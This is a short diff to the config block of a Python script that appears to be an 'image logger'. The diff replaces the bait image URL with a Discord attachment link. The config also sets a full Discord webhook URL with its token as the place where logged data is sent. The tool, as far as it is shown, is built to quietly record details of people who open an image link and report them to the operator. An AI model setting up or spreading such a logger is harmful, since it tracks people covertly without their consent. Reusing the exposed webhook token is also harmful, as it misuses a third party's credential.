@@ -13,7 +13,7 @@ __author__ = "Powni"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1356364653445517372/0Qlagy2RmnAsA6SiCTGNL8GAIiiiiTLDn92M3gmZfNg-L4Cbv44LP5prgKm3iNcLPoR_",
-    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.youtube.com%2F%40SonOyuncuNW&psig=AOvVaw3NxQSCVibBbci8Mp0pDOKy&ust=1743539744324000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCPid2OqVtYwDFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1356533890227114035/1356587389534998559/5bdac50e89b8ed4324a4a7a8f7eb1f77.jpg?ex=67ed1bf5&is=67ebca75&hm=93c9305c8c518a53df301e98cfd83c449cdaf1dbac31a0ede13f714f26e67bd1&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
